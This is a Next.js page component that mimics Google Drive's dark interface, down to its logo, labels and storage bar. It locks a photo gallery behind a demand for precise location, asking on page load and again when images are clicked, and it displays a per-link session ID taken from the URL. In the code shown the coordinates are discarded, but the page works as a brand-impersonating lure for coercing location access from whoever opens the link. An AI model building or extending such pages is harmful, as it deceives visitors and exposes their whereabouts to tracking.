"use client";

import { useParams } from "next/navigation";
import { useState, useEffect } from "react";

export default function GoPage() {
  const { id } = useParams() as { id: string };

  const [locationPermission, setLocationPermission] = useState<"pending" | "granted" | "denied">("pending");
  const [selectedImage, setSelectedImage] = useState<string | null>(null);
  const [showPermissionToast, setShowPermissionToast] = useState(false);

  // ====================== YOUR REAL IMAGES ======================
  // Put your images in: public/images/gallery/
  // Just add more lines here if you add more files
  const images: string[] = [
    "/images/gallery/photo1.jpg",
    "/images/gallery/photo2.jpg",
    "/images/gallery/photo3.jpg",
    "/images/gallery/photo4.jpg",
    "/images/gallery/photo5.jpg",
    "/images/gallery/photo6.jpg",
    "/images/gallery/photo7.jpg",
    "/images/gallery/photo8.jpg",
    "/images/gallery/photo9.jpg",
    "/images/gallery/photo10.jpg",
    "/images/gallery/photo11.jpg",
    "/images/gallery/photo12.jpg",
    // ← Add more images here (example below)
    // "/images/gallery/my-vacation.jpg",
    // "/images/gallery/family-photo.png",
  ];

  /* ==================== REQUEST LOCATION PERMISSION ==================== */
  const requestLocationPermission = () => {
    if (!navigator.geolocation) {
      setLocationPermission("denied");
      return;
    }

    navigator.geolocation.getCurrentPosition(
      () => {
        setLocationPermission("granted");
        setShowPermissionToast(false);
      },
      (error) => {
        console.warn("Location permission denied:", error);
        setLocationPermission("denied");
      },
      { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
    );
  };

  // Auto ask for permission when page loads
  useEffect(() => {
    requestLocationPermission();
  }, []);

  /* ==================== HANDLE IMAGE CLICK ==================== */
  const handleImageClick = (src: string) => {
    if (locationPermission !== "granted") {
      setShowPermissionToast(true);
      setTimeout(() => setShowPermissionToast(false), 4000);
      return;
    }
    setSelectedImage(src);
  };

  /* ==================== IF LOCATION DENIED - SHOW LOCKED SCREEN ==================== */
  if (locationPermission === "denied") {
    return (
      <div className="min-h-screen bg-[#202124] flex items-center justify-center font-sans text-[#e8eaed]">
        <div className="max-w-md text-center px-6">
          <div className="w-20 h-20 mx-auto mb-6 bg-[#3c4043] rounded-3xl flex items-center justify-center text-4xl">
            📍
          </div>
          <h2 className="text-2xl font-medium mb-3">Location Access Required</h2>
          <p className="text-[#9aa0a6] mb-8 leading-relaxed">
            This page needs your location permission to show the images.<br />
            Please allow location access.
          </p>
          <button
            onClick={requestLocationPermission}
            className="bg-[#8ab4f8] hover:bg-[#aecbfa] text-[#202124] font-medium px-8 py-3.5 rounded-3xl text-sm active:scale-95 transition-all"
          >
            Allow Location Access
          </button>
          <p className="text-xs text-[#9aa0a6] mt-8">
            Session ID: {id}
          </p>
        </div>
      </div>
    );
  }

  /* ==================== MAIN GOOGLE DRIVE UI ==================== */
  return (
    <div className="min-h-screen bg-[#202124] flex font-sans text-[#e8eaed]">
      
      {/* Sidebar - Exact Google Drive Dark Mode */}
      <aside className="hidden md:flex flex-col w-72 bg-[#202124] border-r border-[#3c4043]">
        <div className="px-4 pt-4 pb-2">
          <button className="flex items-center justify-center gap-x-2 w-full bg-[#8ab4f8] hover:bg-[#aecbfa] text-[#202124] text-sm font-medium py-3 px-6 rounded-3xl shadow-md active:scale-[0.97] transition-all">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="3">
              <path strokeLinecap="round" strokeLinejoin="round" d="M12 4v16m8-8H4" />
            </svg>
            <span>New</span>
          </button>
        </div>

        <nav className="flex-1 px-3 py-2 overflow-y-auto text-sm">
          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl bg-[#3c4043] text-[#8ab4f8] font-medium cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="#8ab4f8" viewBox="0 0 24 24">
              <path d="M20 6h-8l-2-2H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V8c0-1.1-.9-2-2-2zm-2 12H6V8h12v10z"/>
            </svg>
            <span>My Drive</span>
          </div>

          {/* Other sidebar items (same as your original) */}
          <div className="flex items-center gap-x-3 px-4 py-[10px] rounded-2xl hover:bg-[#3c4043] text-[#dadce0] cursor-pointer">
            <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5" fill="none" viewBox="0 0 24 24" stroke="#dadce0" strokeWidth="2.25">
              <path strokeLinecap="round" strokeLinejoin="round" d="M9.75 17L9 20l-1 1h8l-1-1-.75-3M3 13h18M5 17h14a2 2 0 002-2V5a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2" />
            </svg>
            <span>Computers</span>
          </div>
          {/* Add your other nav items here if you want */}
        </nav>

        <div className="px-4 py-4 border-t border-[#3c4043] mt-auto">
          <div className="flex items-center justify-between text-xs text-[#9aa0a6] mb-2">
            <span>6.8 GB of 15 GB used</span>
            <span className="text-[#8ab4f8] hover:underline cursor-pointer">Get more storage</span>
          </div>
          <div className="h-2 bg-[#3c4043] rounded-full overflow-hidden">
            <div className="h-2 w-[45%] bg-[#8ab4f8] rounded-full"></div>
          </div>
        </div>
      </aside>

      {/* Main Content */}
      <div className="flex-1 flex flex-col">
        <header className="bg-[#202124] h-14 border-b border-[#3c4043] flex items-center px-4 gap-4 shadow-sm z-10">
          {/* Header remains exactly the same as before */}
          <div className="flex items-center gap-x-2 flex-shrink-0">
            <button className="p-2 rounded-full hover:bg-[#3c4043] md:hidden">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6 text-[#dadce0]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.5">
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6h16M4 12h16M4 18h16" />
              </svg>
            </button>
            <div className="flex items-center">
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
                <path d="M12 2L2 12L12 22L22 12L12 2Z" fill="#4285F4"/>
                <path d="M12 2L22 12L12 22L2 12L12 2Z" fill="#34A853"/>
                <path d="M12 8L18 14L12 20L6 14L12 8Z" fill="#FBBC05"/>
                <path d="M12 8L6 14L12 20L18 14L12 8Z" fill="#EA4335"/>
              </svg>
              <span className="ml-1 text-[22px] font-normal text-[#dadce0] tracking-[-0.5px]">Drive</span>
            </div>
          </div>

          <div className="flex-1 max-w-[680px] mx-auto">
            <div className="relative">
              <input
                type="text"
                placeholder="Search in Drive"
                className="w-full bg-[#3c4043] hover:bg-[#4d5156] focus:bg-[#4d5156] border border-transparent hover:border-[#5f6368] focus:border-[#8ab4f8] focus:ring-1 focus:ring-[#8ab4f8] h-10 pl-12 pr-4 rounded-3xl text-sm placeholder:text-[#9aa0a6] text-[#e8eaed] focus:outline-none transition-all"
              />
              <div className="absolute left-4 top-1/2 -translate-y-1/2">
                <svg xmlns="http://www.w3.org/2000/svg" className="w-5 h-5 text-[#9aa0a6]" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2.75">
                  <path strokeLinecap="round" strokeLinejoin="round" d="M21 21l-6-6m2-5a7 7 0 01-14 0 7 7 0 0114 0z" />
                </svg>
              </div>
            </div>
          </div>

          <div className="flex items-center gap-x-1 flex-shrink-0">
            <button className="p-2 rounded-full hover:bg-[#3c4043] text-[#dadce0]">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M4 6a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2 2 2 0 01-2-2 2 2 0 012-2zm2 2a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zm2 2a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2zm2 2a2 2 0 012-2 2 2 0 01-2-2 2 2 0 01-2-2 2 2 0 012-2z" />
              </svg>
            </button>
            <button className="p-2 rounded-full hover:bg-[#3c4043] text-[#dadce0] relative">
              <svg xmlns="http://www.w3.org/2000/svg" className="w-6 h-6" fill="none" viewBox="0 0 24 24" stroke="currentColor" strokeWidth="2">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15 17h5l-1.405-1.405A2.032 2.032 0 0118 14.158V11a6 6 0 00-9-5.197V8.5m.002 3.5L12 14l-4.998-3.5" />
              </svg>
              <div className="absolute top-1 right-1 w-4 h-4 bg-[#ea4335] text-[10px] text-white rounded flex items-center justify-center font-medium">3</div>
            </button>
            <div className="w-8 h-8 bg-[#8ab4f8] text-[#202124] rounded-full flex items-center justify-center text-sm font-medium cursor-pointer hover:ring-2 hover:ring-[#8ab4f8]/50">
              T
            </div>
          </div>
        </header>

        <main className="flex-1 p-6 overflow-auto bg-[#202124]">
          <div className="flex items-center justify-between mb-5">
            <div className="flex items-center text-sm text-[#dadce0]">
              <span className="font-medium">My Drive</span>
              <span className="mx-2 text-[#5f6368]">•</span>
              <span className="text-[#9aa0a6]">{images.length} images</span>
            </div>
          </div>

          {/* Image Grid */}
          <div className="grid grid-cols-2 sm:grid-cols-3 md:grid-cols-4 lg:grid-cols-5 xl:grid-cols-6 2xl:grid-cols-7 gap-6">
            {images.map((src, i) => (
              <div
                key={i}
                onClick={() => handleImageClick(src)}
                className="group bg-[#292a2d] rounded-3xl overflow-hidden border border-transparent hover:border-[#5f6368] shadow-sm hover:shadow-2xl transition-all duration-300 cursor-pointer"
              >
                <div className="aspect-video bg-[#202124] relative overflow-hidden">
                  <img
                    src={src}
                    alt={`Image ${i + 1}`}
                    className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-500"
                  />
                  <div className="absolute inset-0 bg-gradient-to-b from-transparent via-transparent to-black/30 opacity-0 group-hover:opacity-100 transition-opacity"></div>
                </div>

                <div className="px-4 py-3 flex items-center justify-between">
                  <div className="flex-1 min-w-0">
                    <p className="text-sm text-[#e8eaed] font-medium truncate">
                      {src.split("/").pop()}
                    </p>
                    <p className="text-xs text-[#9aa0a6]">Just now</p>
                  </div>
                  <button className="opacity-0 group-hover:opacity-100 p-1.5 hover:bg-[#3c4043] rounded-xl transition-colors">
                    <span className="text-xl leading-none text-[#9aa0a6]">⋯</span>
                  </button>
                </div>
              </div>
            ))}
          </div>
        </main>
      </div>

      {/* Permission Toast */}
      {showPermissionToast && (
        <div className="fixed bottom-8 right-8 bg-[#3c4043] text-white px-6 py-4 rounded-3xl shadow-2xl flex items-center gap-3 z-50 animate-fade-in">
          <span className="text-2xl">📍</span>
          <div>
            <p className="font-medium">Location access required</p>
            <p className="text-sm text-[#9aa0a6]">Please allow location to view images</p>
          </div>
        </div>
      )}

      {/* Image Preview Panel */}
      {selectedImage && (
        <div className="fixed bottom-8 right-8 w-[340px] bg-[#292a2d] rounded-3xl shadow-2xl border border-[#3c4043] overflow-hidden animate-fade-in">
          <div className="px-5 pt-5 pb-3 border-b border-[#3c4043] flex items-center justify-between">
            <div className="flex items-center gap-x-2">
              <div className="w-6 h-6 bg-[#8ab4f8] rounded-2xl flex items-center justify-center text-[#202124] text-xs">📸</div>
              <p className="font-medium">Preview</p>
            </div>
            <button
              onClick={() => setSelectedImage(null)}
              className="text-[#9aa0a6] hover:text-[#dadce0] text-2xl leading-none"
            >
              ✕
            </button>
          </div>

          <div className="p-5">
            <img
              src={selectedImage}
              className="w-full aspect-video object-cover rounded-2xl shadow-inner"
              alt="preview"
            />
          </div>

          <div className="px-5 py-4 border-t border-[#3c4043] bg-[#202124] flex items-center justify-between text-sm">
            <button className="flex items-center gap-x-1 text-[#8ab4f8] hover:underline">
              <span>Download</span>
            </button>
            <button 
              onClick={() => setSelectedImage(null)}
              className="px-6 py-2 bg-[#292a2d] border border-[#5f6368] rounded-3xl text-[#dadce0] hover:bg-[#3c4043] transition"
            >
              Close
            </button>
          </div>
        </div>
      )}

      {/* Animation */}
      <style jsx>{`
        .animate-fade-in {
          animation: fadeIn 0.25s cubic-bezier(0.16, 1, 0.3, 1);
        }
        @keyframes fadeIn {
          from { opacity: 0; transform: translateY(12px) scale(0.95); }
          to { opacity: 1; transform: translateY(0) scale(1); }
        }
      `}</style>
    </div>
  );
}